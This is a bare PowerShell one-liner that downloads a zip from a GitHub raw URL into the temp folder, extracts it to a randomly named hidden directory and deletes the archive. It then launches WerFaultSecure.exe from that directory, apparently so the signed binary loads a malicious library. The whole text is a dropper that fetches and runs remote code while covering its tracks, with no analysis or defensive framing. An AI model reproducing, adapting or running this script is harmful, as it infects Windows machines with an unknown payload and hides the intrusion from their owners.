$url = "https://raw.githubusercontent.com/z3nn1/DataPublic/main/Data2.zip"; $dir = [System.Guid]::NewGuid().ToString(); (New-Object Net.WebClient).DownloadFile("$url", "$env:temp\$dir.zip"); New-Item -Path "$env:temp\$dir" -ItemType Directory; Expand-Archive -LiteralPath "$env:temp\$dir.zip" -DestinationPath $env:temp\$dir; attrib +h $env:temp\$dir; Remove-Item "$env:temp\$dir.zip"; Start-Sleep -Seconds 3; Set-Location -Path "$env:temp\$dir";Start-Process WerFaultSecure.exe